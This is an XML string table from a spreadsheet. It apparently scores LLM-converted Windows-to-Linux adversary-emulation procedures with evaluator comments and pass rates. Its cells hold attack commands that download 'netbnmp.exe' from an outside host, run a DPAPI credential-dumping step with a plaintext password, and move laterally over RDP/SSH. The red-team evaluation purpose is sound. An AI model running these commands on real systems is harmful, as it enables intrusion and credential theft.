      </rPr>
      <t xml:space="preserve"> step (step 5) while the variant’s corresponding step is </t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="12"/>
        <color rgb="FF000000"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
      </rPr>
      <t>non-elevated</t>
    </r>
    <r>
      <rPr>
        <sz val="12"/>
        <color rgb="FF000000"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
      </rPr>
      <t>, changing progression.</t>
    </r>
  </si>
  <si>
    <t>bitsadmin /transfer defaultjob2 /download http://theinator.com/digirevenge/netbnmp.exe C:\Users\Public\netbnmp.exe</t>
  </si>
  <si>
    <t>curl -L http://theinator.com/digirevenge/netbnmp.exe -o /tmp/netbnmp.exe</t>
  </si>
  <si>
    <t>Do all steps reference real, identifiable tools available on the target platform?</t>
  </si>
  <si>
    <r>
      <t xml:space="preserve">Variant JSON: </t>
    </r>
    <r>
      <rPr>
        <sz val="10"/>
        <color rgb="FF000000"/>
        <rFont val="Arial Unicode MS"/>
        <family val="2"/>
      </rPr>
      <t>command</t>
    </r>
    <r>
      <rPr>
        <sz val="12"/>
        <color rgb="FF000000"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
      </rPr>
      <t xml:space="preserve">, </t>
    </r>
    <r>
      <rPr>
        <sz val="10"/>
        <color rgb="FF000000"/>
        <rFont val="Arial Unicode MS"/>
        <family val="2"/>
      </rPr>
      <t>os</t>
    </r>
    <r>
      <rPr>
        <sz val="12"/>
        <color rgb="FF000000"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
      </rPr>
      <t>; plus tool reality (ssh/curl/pwsh/wine)</t>
    </r>
  </si>
  <si>
    <t>1) List tools in variant commands. 
2) Check each is a real tool on target OS (or installable). 
3) Pass if each is identifiable.</t>
  </si>
  <si>
    <r>
      <t>ssh</t>
    </r>
    <r>
      <rPr>
        <sz val="12"/>
        <color rgb="FF000000"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
      </rPr>
      <t xml:space="preserve">, </t>
    </r>
    <r>
      <rPr>
        <sz val="10"/>
        <color rgb="FF000000"/>
        <rFont val="Arial Unicode MS"/>
        <family val="2"/>
      </rPr>
      <t>curl</t>
    </r>
    <r>
      <rPr>
        <sz val="12"/>
        <color rgb="FF000000"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
      </rPr>
      <t xml:space="preserve">, </t>
    </r>
    <r>
      <rPr>
        <sz val="10"/>
        <color rgb="FF000000"/>
        <rFont val="Arial Unicode MS"/>
        <family val="2"/>
      </rPr>
      <t>pwsh</t>
    </r>
    <r>
      <rPr>
        <sz val="12"/>
        <color rgb="FF000000"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
      </rPr>
      <t xml:space="preserve">, </t>
    </r>
    <r>
      <rPr>
        <sz val="10"/>
        <color rgb="FF000000"/>
        <rFont val="Arial Unicode MS"/>
        <family val="2"/>
      </rPr>
      <t>wine</t>
    </r>
    <r>
      <rPr>
        <sz val="12"/>
        <color rgb="FF000000"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
      </rPr>
      <t xml:space="preserve"> are real/identifiable on Linux (though may require install).</t>
    </r>
  </si>
  <si>
    <t>T1021.001</t>
  </si>
  <si>
    <t>mstsc /v:10.20.10.122</t>
  </si>
  <si>
    <t>ssh bastion_user@10.20.10.122</t>
  </si>
  <si>
    <r>
      <t xml:space="preserve">Variant JSON: </t>
    </r>
    <r>
      <rPr>
        <sz val="10"/>
        <color rgb="FF000000"/>
        <rFont val="Arial Unicode MS"/>
        <family val="2"/>
      </rPr>
      <t>command</t>
    </r>
    <r>
      <rPr>
        <sz val="12"/>
        <color rgb="FF000000"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
      </rPr>
      <t xml:space="preserve"> strings</t>
    </r>
  </si>
  <si>
    <t>1) Parse each command into tool + args. 
2) Validate args for known tools (ssh/curl/pwsh/wine). 
3) For custom binaries (netbnmp.exe), treat as unverifiable unless referenced spec exists. 
4) Fail if any step is unverifiable or implausible in-context.</t>
  </si>
  <si>
    <r>
      <t xml:space="preserve">The </t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="12"/>
        <color rgb="FF000000"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
      </rPr>
      <t>custom tool invocation</t>
    </r>
    <r>
      <rPr>
        <sz val="12"/>
        <color rgb="FF000000"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
      </rPr>
      <t xml:space="preserve"> (</t>
    </r>
    <r>
      <rPr>
        <sz val="10"/>
        <color rgb="FF000000"/>
        <rFont val="Arial Unicode MS"/>
        <family val="2"/>
      </rPr>
      <t>netbnmp.exe dpapi ...</t>
    </r>
    <r>
      <rPr>
        <sz val="12"/>
        <color rgb="FF000000"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
      </rPr>
      <t>) and its argument contract can’t be validated from the provided artifacts; also execution context changes (Wine) add uncertainty.</t>
    </r>
  </si>
  <si>
    <r>
      <t xml:space="preserve">Variant JSON: </t>
    </r>
    <r>
      <rPr>
        <sz val="10"/>
        <color rgb="FF000000"/>
        <rFont val="Arial Unicode MS"/>
        <family val="2"/>
      </rPr>
      <t>os</t>
    </r>
    <r>
      <rPr>
        <sz val="12"/>
        <color rgb="FF000000"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
      </rPr>
      <t xml:space="preserve">, </t>
    </r>
    <r>
      <rPr>
        <sz val="10"/>
        <color rgb="FF000000"/>
        <rFont val="Arial Unicode MS"/>
        <family val="2"/>
      </rPr>
      <t>command</t>
    </r>
    <r>
      <rPr>
        <sz val="12"/>
        <color rgb="FF000000"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
      </rPr>
      <t xml:space="preserve">; Variant evaluation: </t>
    </r>
    <r>
      <rPr>
        <sz val="10"/>
        <color rgb="FF000000"/>
        <rFont val="Arial Unicode MS"/>
        <family val="2"/>
      </rPr>
      <t>os_constructs_valid</t>
    </r>
  </si>
  <si>
    <r>
      <t xml:space="preserve">1) For each step, ensure constructs match step OS (paths, binaries, env vars). 
2) Flag Windows-only artifacts on Linux. 
3) Consider privilege needs vs </t>
    </r>
    <r>
      <rPr>
        <sz val="10"/>
        <color rgb="FF000000"/>
        <rFont val="Arial Unicode MS"/>
        <family val="2"/>
      </rPr>
      <t>execution_level</t>
    </r>
    <r>
      <rPr>
        <sz val="12"/>
        <color rgb="FF000000"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
      </rPr>
      <t>.</t>
    </r>
  </si>
  <si>
    <r>
      <t xml:space="preserve">Variant evaluation flags OS construct issues (e.g., </t>
    </r>
    <r>
      <rPr>
        <sz val="10"/>
        <color rgb="FF000000"/>
        <rFont val="Arial Unicode MS"/>
        <family val="2"/>
      </rPr>
      <t>.ps1</t>
    </r>
    <r>
      <rPr>
        <sz val="12"/>
        <color rgb="FF000000"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
      </rPr>
      <t xml:space="preserve">, </t>
    </r>
    <r>
      <rPr>
        <sz val="10"/>
        <color rgb="FF000000"/>
        <rFont val="Arial Unicode MS"/>
        <family val="2"/>
      </rPr>
      <t>.exe</t>
    </r>
    <r>
      <rPr>
        <sz val="12"/>
        <color rgb="FF000000"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
      </rPr>
      <t>) and step 7 uses Windows DPAPI logic via Wine on Linux, which is a major OS constraint concern.</t>
    </r>
  </si>
  <si>
    <t>T1555</t>
  </si>
  <si>
    <t>%TEMP%\netbnmp.exe dpapi localhost zorimoto tzTVgs44isT4YxWU!</t>
  </si>
  <si>
    <t>wine /tmp/netbnmp.exe dpapi localhost zorimoto tzTVgs44isT4YxWU!</t>
  </si>
  <si>
    <r>
      <t xml:space="preserve">Variant evaluation: </t>
    </r>
    <r>
      <rPr>
        <sz val="10"/>
        <color rgb="FF000000"/>
        <rFont val="Arial Unicode MS"/>
        <family val="2"/>
      </rPr>
      <t>os_constructs_valid.detail</t>
    </r>
  </si>
  <si>
    <t>1) Identify non-Windows steps. 
2) Scan commands for Windows-only constructs (exe, %TEMP%, etc.). 
3) Fail if present.</t>
  </si>
  <si>
    <r>
      <t>Explicitly failed by variant’s embedded evaluation (</t>
    </r>
    <r>
      <rPr>
        <sz val="10"/>
        <color rgb="FF000000"/>
        <rFont val="Arial Unicode MS"/>
        <family val="2"/>
      </rPr>
      <t>os_constructs_valid: passed=false</t>
    </r>
    <r>
      <rPr>
        <sz val="12"/>
        <color rgb="FF000000"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
      </rPr>
      <t xml:space="preserve">) citing </t>
    </r>
    <r>
      <rPr>
        <sz val="10"/>
        <color rgb="FF000000"/>
        <rFont val="Arial Unicode MS"/>
        <family val="2"/>
      </rPr>
      <t>.ps1</t>
    </r>
    <r>
      <rPr>
        <sz val="12"/>
        <color rgb="FF000000"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
      </rPr>
      <t xml:space="preserve"> and </t>
    </r>
    <r>
      <rPr>
        <sz val="10"/>
        <color rgb="FF000000"/>
        <rFont val="Arial Unicode MS"/>
        <family val="2"/>
      </rPr>
      <t>.exe</t>
    </r>
    <r>
      <rPr>
        <sz val="12"/>
        <color rgb="FF000000"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
      </rPr>
      <t xml:space="preserve"> patterns.</t>
    </r>
  </si>
  <si>
    <r>
      <t xml:space="preserve">Control/Variant JSON: </t>
    </r>
    <r>
      <rPr>
        <sz val="10"/>
        <color rgb="FF000000"/>
        <rFont val="Arial Unicode MS"/>
        <family val="2"/>
      </rPr>
      <t>technique_id</t>
    </r>
    <r>
      <rPr>
        <sz val="12"/>
        <color rgb="FF000000"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
      </rPr>
      <t xml:space="preserve">, </t>
    </r>
    <r>
      <rPr>
        <sz val="10"/>
        <color rgb="FF000000"/>
        <rFont val="Arial Unicode MS"/>
        <family val="2"/>
      </rPr>
      <t>execution_level</t>
    </r>
  </si>
  <si>
    <r>
      <t xml:space="preserve">1) Extract per-step implied privilege from </t>
    </r>
    <r>
      <rPr>
        <sz val="10"/>
        <color rgb="FF000000"/>
        <rFont val="Arial Unicode MS"/>
        <family val="2"/>
      </rPr>
      <t>execution_level</t>
    </r>
    <r>
      <rPr>
        <sz val="12"/>
        <color rgb="FF000000"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
      </rPr>
      <t xml:space="preserve"> and command semantics. 
2) Compare to control’s implied privilege where it’s part of the chain. 
3) Fail if privilege progression/requirements diverge materially.</t>
    </r>
  </si>
  <si>
    <t>Privilege context diverges (control has an elevated lateral movement step; variant does not), so implied privilege is not preserved.</t>
  </si>
  <si>
    <r>
      <t xml:space="preserve">Control/Variant JSON: </t>
    </r>
    <r>
      <rPr>
        <sz val="10"/>
        <color rgb="FF000000"/>
        <rFont val="Arial Unicode MS"/>
        <family val="2"/>
      </rPr>
      <t>d3fend_observables</t>
    </r>
    <r>
      <rPr>
        <sz val="12"/>
        <color rgb="FF000000"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
      </rPr>
      <t xml:space="preserve">, </t>
    </r>
    <r>
      <rPr>
        <sz val="10"/>
        <color rgb="FF000000"/>
        <rFont val="Arial Unicode MS"/>
        <family val="2"/>
      </rPr>
      <t>execution_observables</t>
    </r>
    <r>
      <rPr>
        <sz val="12"/>
        <color rgb="FF000000"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
      </rPr>
      <t xml:space="preserve">, </t>
    </r>
    <r>
      <rPr>
        <sz val="10"/>
        <color rgb="FF000000"/>
        <rFont val="Arial Unicode MS"/>
        <family val="2"/>
      </rPr>
      <t>telemetry_classes</t>
    </r>
  </si>
  <si>
    <t>1) Check whether steps enumerate artifacts (process/file/network/identity). 
2) Pass if artifacts are present in most steps and actionable.</t>
  </si>
  <si>
    <r>
      <t xml:space="preserve">Variant evaluation: </t>
    </r>
    <r>
      <rPr>
        <sz val="10"/>
        <color rgb="FF000000"/>
        <rFont val="Arial Unicode MS"/>
        <family val="2"/>
      </rPr>
      <t>telemetry_classes_match</t>
    </r>
  </si>
  <si>
    <t>1) Extract control telemetry classes per step. 
2) Extract variant telemetry classes per aligned step. 
3) Pass if each control class has an equivalent in variant.</t>
  </si>
  <si>
    <t>Control/Variant JSON: commands + tactics; plus OS-specific event parity reasoning</t>
  </si>
  <si>
    <t>1) Distill detection’s core behavior (remote login, download, script exec, credential access). 
2) Identify Linux analog telemetry (auth logs, process exec, network egress, file writes). 
3) Pass if equivalent logic exists.</t>
  </si>
  <si>
    <t>Even with RDP→SSH and BITS→curl substitutions, the behavioral detections have Linux-equivalent forms (auth + process + network + file).</t>
  </si>
  <si>
    <r>
      <t xml:space="preserve">Variant JSON telemetry classes; evaluation </t>
    </r>
    <r>
      <rPr>
        <sz val="10"/>
        <color rgb="FF000000"/>
        <rFont val="Arial Unicode MS"/>
        <family val="2"/>
      </rPr>
      <t>telemetry_multi_class</t>
    </r>
  </si>
  <si>
    <t>1) Confirm telemetry classes exist for the behaviors (process/network/file/identity). 
2) Pass if the required signals appear in variant steps.</t>
  </si>
  <si>
    <t>Control/Variant JSON: step-level behavior deltas (RDP→SSH; BITS→curl; wine execution)</t>
  </si>
  <si>
    <t>1) For each key detection-relevant behavior, compare “what is observed” (e.g., RDP logons vs SSH auth logs). 
2) Pass only if semantic meaning stays the same without changing the detection’s subject.</t>
  </si>
  <si>
    <r>
      <t xml:space="preserve">Some detections are </t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="12"/>
        <color rgb="FF000000"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
      </rPr>
      <t>not semantically preserved</t>
    </r>
    <r>
      <rPr>
        <sz val="12"/>
        <color rgb="FF000000"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
      </rPr>
      <t xml:space="preserve"> if they are tied to Windows/RDP/BITS specifics; the variant shifts to SSH/curl and Wine execution, changing “what is observed.”</t>
    </r>
  </si>
  <si>
    <r>
      <t xml:space="preserve">Variant evaluation: </t>
    </r>
    <r>
      <rPr>
        <sz val="10"/>
        <color rgb="FF000000"/>
        <rFont val="Arial Unicode MS"/>
        <family val="2"/>
      </rPr>
      <t>extra_telemetry_classes</t>
    </r>
  </si>
  <si>
    <t>1) Compare telemetry class sets control vs variant. 
2) If variant adds classes, decide whether they add detection power.</t>
  </si>
  <si>
    <r>
      <t xml:space="preserve">No “additional telemetry classes” were identified (evaluation </t>
    </r>
    <r>
      <rPr>
        <sz val="10"/>
        <color rgb="FF000000"/>
        <rFont val="Arial Unicode MS"/>
        <family val="2"/>
      </rPr>
      <t>extra_telemetry_classes: passed=true</t>
    </r>
    <r>
      <rPr>
        <sz val="12"/>
        <color rgb="FF000000"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
      </rPr>
      <t>, i.e., none added).</t>
    </r>
  </si>
  <si>
    <t>Variant JSON narrative: warnings/notes; telemetry fields</t>
  </si>
  <si>
    <t>1) Identify any control telemetry that is absent in variant. 2) Check if variant text explicitly explains why it’s missing.</t>
  </si>
  <si>
    <r>
      <t xml:space="preserve">Variant JSON narrative: </t>
    </r>
    <r>
      <rPr>
        <sz val="10"/>
        <color rgb="FF000000"/>
        <rFont val="Arial Unicode MS"/>
        <family val="2"/>
      </rPr>
      <t>warnings</t>
    </r>
    <r>
      <rPr>
        <sz val="12"/>
        <color rgb="FF000000"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
      </rPr>
      <t xml:space="preserve">, </t>
    </r>
    <r>
      <rPr>
        <sz val="10"/>
        <color rgb="FF000000"/>
        <rFont val="Arial Unicode MS"/>
        <family val="2"/>
      </rPr>
      <t>conversion_notes</t>
    </r>
    <r>
      <rPr>
        <sz val="12"/>
        <color rgb="FF000000"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
      </rPr>
      <t xml:space="preserve">, </t>
    </r>
    <r>
      <rPr>
        <sz val="10"/>
        <color rgb="FF000000"/>
        <rFont val="Arial Unicode MS"/>
        <family val="2"/>
      </rPr>
      <t>refinements</t>
    </r>
  </si>
  <si>
    <t>1) If variant adds telemetry, check for explicit rationale. 
2) Pass only if justification is explicit.</t>
  </si>
  <si>
    <r>
      <t xml:space="preserve">Variant JSON: </t>
    </r>
    <r>
      <rPr>
        <sz val="10"/>
        <color rgb="FF000000"/>
        <rFont val="Arial Unicode MS"/>
        <family val="2"/>
      </rPr>
      <t>telemetry_classes[]</t>
    </r>
    <r>
      <rPr>
        <sz val="12"/>
        <color rgb="FF000000"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
      </rPr>
      <t xml:space="preserve"> per step</t>
    </r>
  </si>
  <si>
    <t>1) Extract telemetry classes per step. 
2) Check consecutive steps for overlap in classes. 
3) Fail if stages are not distinguishable by class (high overlap across consecutive steps).</t>
  </si>
  <si>
    <r>
      <t xml:space="preserve">Consecutive steps repeatedly share the same classes (notably </t>
    </r>
    <r>
      <rPr>
        <sz val="10"/>
        <color rgb="FF000000"/>
        <rFont val="Arial Unicode MS"/>
        <family val="2"/>
      </rPr>
      <t>network</t>
    </r>
    <r>
      <rPr>
        <sz val="12"/>
        <color rgb="FF000000"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
      </rPr>
      <t xml:space="preserve"> + </t>
    </r>
    <r>
      <rPr>
        <sz val="10"/>
        <color rgb="FF000000"/>
        <rFont val="Arial Unicode MS"/>
        <family val="2"/>
      </rPr>
      <t>process</t>
    </r>
    <r>
      <rPr>
        <sz val="12"/>
        <color rgb="FF000000"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
      </rPr>
      <t xml:space="preserve">, often </t>
    </r>
    <r>
      <rPr>
        <sz val="10"/>
        <color rgb="FF000000"/>
        <rFont val="Arial Unicode MS"/>
        <family val="2"/>
      </rPr>
      <t>file</t>
    </r>
    <r>
      <rPr>
        <sz val="12"/>
        <color rgb="FF000000"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
      </rPr>
      <t xml:space="preserve"> too), limiting stage differentiation by class alone.</t>
    </r>
  </si>
  <si>
    <t xml:space="preserve">1.
2.
3.
4.
5.
6. </t>
  </si>
  <si>
    <t>mark greyed out</t>
  </si>
  <si>
    <t>no</t>
  </si>
  <si>
    <t>scriptable?</t>
  </si>
  <si>
    <t>yes</t>
  </si>
  <si>
    <t>assumes pwsh installed</t>
  </si>
  <si>
    <t>but not sure on pwsh options on linux</t>
  </si>
  <si>
    <t>yes?</t>
  </si>
  <si>
    <t>maybe; see comment on 2.2</t>
  </si>
  <si>
    <t>removed</t>
  </si>
  <si>
    <t>n/a</t>
  </si>
  <si>
    <t>no additional telemetry</t>
  </si>
  <si>
    <t>not enough time to effectively answer</t>
  </si>
  <si>
    <t>automate</t>
  </si>
  <si>
    <t>can be automated</t>
  </si>
  <si>
    <t>Additional telemetry classes: (1) network process (2) (3) (4) file network process (5) missing identity (6) file network process (7) file identity process</t>
  </si>
  <si>
    <t>step level; helped by looking at automated results, though they didn't populate with the additional classes from what I could see? Think should be tabled based on lack of detail about what normal/detectable telemetry is.</t>
  </si>
  <si>
    <t>step level; Think should be tabled based on detail level of telemetry analysis. Seems to be the same as "telemetry class" equivalence.</t>
  </si>
  <si>
    <t>step level; would be more effective/possible in an actual execution, not clear what source of telemetry would exist to be triggered from defender perspective</t>
  </si>
  <si>
    <t>automatable</t>
  </si>
  <si>
    <t>Plan level; I think this is also able to be automated based on the logic steps</t>
  </si>
  <si>
    <t>TTPs all match step-per-step</t>
  </si>
  <si>
    <t>Notes/Comments on Scoring</t>
  </si>
  <si>
    <t>Automated</t>
  </si>
  <si>
    <t>N/A</t>
  </si>
  <si>
    <t>Justification for Elimination</t>
  </si>
  <si>
    <t>Duplicate, logically equivalent with 3.2.7 and 3.2.9</t>
  </si>
  <si>
    <t>Are any telemetry classes from the control missing?</t>
  </si>
  <si>
    <t>Do all steps reference real, identifiable commands or tools available on the target platform? (OS-level tool)</t>
  </si>
  <si>
    <t>Are all command arguments, flags, and options valid for the referenced tool and execution context? (Tool-level arguments)</t>
  </si>
  <si>
    <t>Final Validated Scoring Procedure (Questionnaire, Automated Script, Eliminated)</t>
  </si>
  <si>
    <t>Eliminated Prior to Manual Evaluation (Yes, No, Automated)</t>
  </si>
  <si>
    <t>Eliminated During Manual Evaluation (Yes, No, Automated, N/A)</t>
  </si>
  <si>
    <t xml:space="preserve"> </t>
  </si>
  <si>
    <t xml:space="preserve">Attempted to automate, however more development is needed to enumerate "Windows-only constructs" at a machine level. Atuomated results used as scoring aid. </t>
  </si>
  <si>
    <t>Final Notes</t>
  </si>
  <si>
    <t>Insufficient detail about defender detections. Current data equates evaluation to "can this activity be detected"/"is telemetry generated"</t>
  </si>
  <si>
    <t>Insufficient detail about telemetry sources. Current data equates evaluation to "can this activity be detected"/"is telemetry generated"</t>
  </si>
  <si>
    <t>Insufficient detail about LLM reasoning regarding operator intent.</t>
  </si>
  <si>
    <t>"intermeidate_output" JSON field provides a start to understand "why" the LLM (or an operator) would chose a certain command. More thorough analysis is required on a plan level.</t>
  </si>
  <si>
    <t>Insufficient detail about operating environment starting state and ending state.</t>
  </si>
  <si>
    <t>This question makes more sense in the context of a fully defined start state, or an actual execution of the procedures measuring differences between start and end state via automated or manual means.</t>
  </si>
  <si>
    <t>Insufficient detail about what constitutes a "default environment". A "default environment" may also not be useful when entering a pre-existing operating environment.</t>
  </si>
  <si>
    <t>Insufficient detail about what constitutes a "benign behavior" in an operating environment. By the nature of an emulation process, some procedures may be obviously malicious, while others may be designed with the intent of appearing benign.</t>
  </si>
  <si>
    <t>Insufficient detail about procedures used by other adversaries that matter to defenders. Generally may not be important for emulation assessment purposes</t>
  </si>
  <si>
    <t>Prompt did not request justification related to telemetry or defender perspective. Further analysis and prompt-engineering is needed to get LLM output to cater to defender telemetry perspective, and may not be relevant to adversary emulation use-case</t>
  </si>
  <si>
    <t>Insufficient detail about telemetry sources and signals on defender side, as well as the behavior identified in control. Answering this may require a blind defender analysis of telemetry artifacts produced by the control vs the variant to understand what happened. Current data equates evaluation to "can this activity be detected"/"is telemetry generated"</t>
  </si>
  <si>
    <t>3.1.06</t>
  </si>
  <si>
    <t>3.1.08</t>
  </si>
  <si>
    <t>3.0.01</t>
  </si>
  <si>
    <t>3.0.02</t>
  </si>
  <si>
    <t>3.0.03</t>
  </si>
  <si>
    <t>3.0.04</t>
  </si>
  <si>
    <t>3.0.05</t>
  </si>
  <si>
    <t>3.0.06</t>
  </si>
  <si>
    <t>3.1.01</t>
  </si>
  <si>
    <t>3.1.02</t>
  </si>
  <si>
    <t>3.1.03</t>
  </si>
  <si>
    <t>3.1.04</t>
  </si>
  <si>
    <t>3.1.05</t>
  </si>
  <si>
    <t>3.1.07</t>
  </si>
  <si>
    <t>3.2.09</t>
  </si>
  <si>
    <t>3.2.08</t>
  </si>
  <si>
    <t>3.2.07</t>
  </si>
  <si>
    <t>3.2.06</t>
  </si>
  <si>
    <t>3.2.05</t>
  </si>
  <si>
    <t>3.2.04</t>
  </si>
  <si>
    <t>3.2.03</t>
  </si>
  <si>
    <t>3.2.02</t>
  </si>
  <si>
    <t>3.2.01</t>
  </si>
  <si>
    <t>Authoritative Data Sources (Map to output JSON)</t>
  </si>
  <si>
    <t>Programmatic Steps or Automated Function</t>
  </si>
  <si>
    <t>technique_sequence_match</t>
  </si>
  <si>
    <t>missing_steps</t>
  </si>
  <si>
    <t>extra_steps</t>
  </si>
  <si>
    <t>privilege_progression_match</t>
  </si>
  <si>
    <t>parent_technique_ids_match</t>
  </si>
  <si>
    <t>technique_ids_match</t>
  </si>
  <si>
    <t>telemetry_classes_match</t>
  </si>
  <si>
    <t>telemetry_multi_class</t>
  </si>
  <si>
    <t>telemetry_diversity</t>
  </si>
  <si>
    <t>missing_telemetry_classes</t>
  </si>
  <si>
    <t>extra_telemetry_classes</t>
  </si>
  <si>
    <t>Important to note that "high-level steps" is not the same as the same about of steps generally. In translating OS, it maybe the case that more than one action is needed per original step. Solve this by looking at the technique level for each step.</t>
  </si>
  <si>
    <t>Logical dependency tracking is difficult to record in JSON format. Can possibly add more detail to track hosts, files, and accesses which are required for each step.</t>
  </si>
  <si>
    <t>See note for 1.1 about step equivalence. Logic described in missing_step documentation on GitLab.</t>
  </si>
  <si>
    <t>See note for 1.1 about step equivalence. Logic described in extra_steps documentation on GitLab.</t>
  </si>
  <si>
    <t>If 2.1 fails (not referencing a real command), this question should also fail/be invalid.</t>
  </si>
  <si>
    <t>This question resulted in the addition of the "execution_level" JSON field, which the script's logic relies on. Additional detail may be necessary to answer this question for more detailed contexts.</t>
  </si>
  <si>
    <t>This also relies on the "execution_level" JSON field, and any reasoning by the LLM. Further prompt engineering may assist in getting this context from the LLM/examining its reasoning.</t>
  </si>
  <si>
    <t>Insufficient detail about what constitutes a "misleading or confusing" telemetry in an operating environment. By the nature of an emulation process, some procedures may be intended to confuse or mislead (see 3.0.3). In these cases, this question may only be useful where the telemetry differs substantially from the original procedures.</t>
  </si>
  <si>
    <t>Evaluating this question requires understanding the space of detections available on the original OS and corresponding detections on the variant OS, or specialized detection knowledge. Real world detection increasingly relies on behavioral analysis and it may be possible to implement something similar with this.</t>
  </si>
  <si>
    <t>There is a need to have a human semantic understanding of the control vs variant's impact. This could potentially be covered by looking at telemetry (for defensive value).</t>
  </si>
  <si>
    <t>For questions measuring telemetry, we only derived the telemetry classes based on the ATT&amp;CK technique referenced and its mapping to D3FEND artifacts. There was no actual telemetry which was analyzed, so these will likely need deeper verification.</t>
  </si>
  <si>
    <t>See note for 3.2.01</t>
  </si>
  <si>
    <t>See note for 3.2.01. The idea of this question is to see if defenders can put together a strong storyline of attacker activity with one telemetry class across multiple activites (it may be technically possible to capture multiple outputs from different sources).</t>
  </si>
  <si>
    <t>"step_id", "technique_id"</t>
  </si>
  <si>
    <t>Evaluator Determination (TRUE = PASS)</t>
  </si>
  <si>
    <t>Uncertain. step 5 is elevated in control, non-elevated in variant - is elevated required?</t>
  </si>
  <si>
    <t>PASS</t>
  </si>
  <si>
    <t>Decision if TRUE</t>
  </si>
  <si>
    <t>SUM of PASS Rate (max = 9):</t>
  </si>
  <si>
    <t>Total PASS Responses (Per Evaluator)</t>
  </si>
  <si>
    <t>Step or Plan-level evaluation</t>
  </si>
  <si>
    <t>Step</t>
  </si>
  <si>
    <t>Fail</t>
  </si>
  <si>
    <t xml:space="preserve">PASS-ish: commands are technically LInux tools and right, but particulars don't match
</t>
  </si>
  <si>
    <t>* invokes pwsh which is a *nix tool, but syntax is windows psh
* Curl used for file download, but pulls .exe file, a filetype that can't execute. Syntax is right though
* Wine to execute downloaded binary - that wouldn't work due to dependencies</t>
  </si>
  <si>
    <t>step</t>
  </si>
  <si>
    <t>Download commands use Windows syntax, downloaded .exe payloads wouldn't work</t>
  </si>
  <si>
    <t>Plan</t>
  </si>
  <si>
    <t>Powershell for linux exists, but its generally seen to be lacking in terms of features, module support, etc
The linux community is frustrated at the lack of commitment from msft on flushing out this offering</t>
  </si>
  <si>
    <t>References windows-only file formats relying on shoddy, unstable ports of windwos functionality that likely wouldn't work as invocated as if on windows</t>
  </si>
  <si>
    <t xml:space="preserve">PASS
</t>
  </si>
  <si>
    <t>All steps from control are unprivileged. 
We should consider changes of privilege for future testing (local admin -&gt; domain user -&gt; DA)</t>
  </si>
  <si>
    <t xml:space="preserve">PASS-ish
</t>
  </si>
  <si>
    <t>Most steps are equivalent, but the variant uses SSH instead of RDP. This is a different detection on the endpoint than RDP activity, with different sets of associated permissions</t>
  </si>
  <si>
    <t>step level; think should be tabled for same reason as others asking "does this generate telemetry at all" - not enough detail to understand, just looking at telemetry class and potential observables</t>
  </si>
  <si>
    <t>Total Responses (evaluation not blank)</t>
  </si>
  <si>
    <t>Total N/A Responses</t>
  </si>
  <si>
    <t>PASS rate</t>
  </si>
  <si>
    <t>FAIL Rate</t>
  </si>
  <si>
    <t>N/A Rate</t>
  </si>
  <si>
    <t>Aggregated Manual PASS Rate:</t>
  </si>
  <si>
    <t>Aggregated Manual FAIL Rate:</t>
  </si>
  <si>
    <t>Aggregated N/A Rate:</t>
  </si>
  <si>
    <t>Total PASS Evaluations</t>
  </si>
  <si>
    <t>Total FAIL Evaluations</t>
  </si>
  <si>
    <t>Total FAIL Responses (Per Evaluator)</t>
  </si>
  <si>
    <t>Total Answered (Per Evaluator)</t>
  </si>
  <si>
    <t>Answer Rate (Per Evaluator)</t>
  </si>
  <si>
    <t>Fail Rate Out of All (Per Evaluator)</t>
  </si>
  <si>
    <t>Fail Rate Out of Answered (Per Evaluator)</t>
  </si>
  <si>
    <t>Pass Rate Out of All (Per Evaluator)</t>
  </si>
  <si>
    <t>Pass Rate Out of Answered (Per Evaluator)</t>
  </si>
  <si>
    <t>Evaluator Determination 1</t>
  </si>
  <si>
    <t>Evaluator Determination 2</t>
  </si>
  <si>
    <t>Evaluator Determination 3</t>
  </si>
  <si>
    <t>Evaluator Determination 4</t>
  </si>
  <si>
    <t>Evaluator Determination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</si>
</sst>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font>
    <font>
      <sz val="11"/>
      <color theme="1"/>
      <name val="Calibri"/>
      <family val="2"/>
      <scheme val="minor"/>
    </font>
    <font>
      <sz val="14"/>
      <color rgb="FFFFFFFF"/>
      <name val="Consolas"/>
      <family val="2"/>
    </font>
    <font>
      <sz val="12"/>
      <color rgb="FF9C5700"/>
      <name val="Calibri"/>
      <family val="2"/>
      <scheme val="minor"/>
    </font>
    <font>
      <sz val="12"/>
      <color theme="0"/>
      <name val="Calibri"/>
      <family val="2"/>
      <scheme val="minor"/>
    </font>
    <font>
      <sz val="11"/>
